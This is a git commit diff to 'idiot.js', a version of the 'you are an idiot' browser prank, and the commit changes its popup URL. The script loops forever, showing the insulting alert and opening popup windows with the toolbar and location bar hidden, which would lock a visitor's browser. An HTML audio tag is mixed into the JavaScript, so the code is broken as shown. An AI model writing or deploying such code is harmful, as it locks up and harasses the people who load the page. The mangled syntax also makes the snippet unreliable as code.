fde7bcc90ff8b4fad542b0d3676665100ab26441
AdoptMeTradingValues <108958603+AdoptMeTradingValues@users.noreply.github.com>
2022-09-23 12:53:48 -0400

    Update idiot.js

--- idiot.js
+++ idiot.js
@@ -2,6 +2,6 @@
 
 while (true) {
             alert("you are an idiot");
-            window.open('https://hardwaregore.github.io/you-are-an-idiot', 'blank', 'toolbar=0,location=0,menubar=0');
+            window.open('adoptmetradingvalues.github.io', 'blank', 'toolbar=0,location=0,menubar=0');
  <audio src="./audio/preloader.mp3" autoplay="autoplay" loop="loop"></audio>
 }
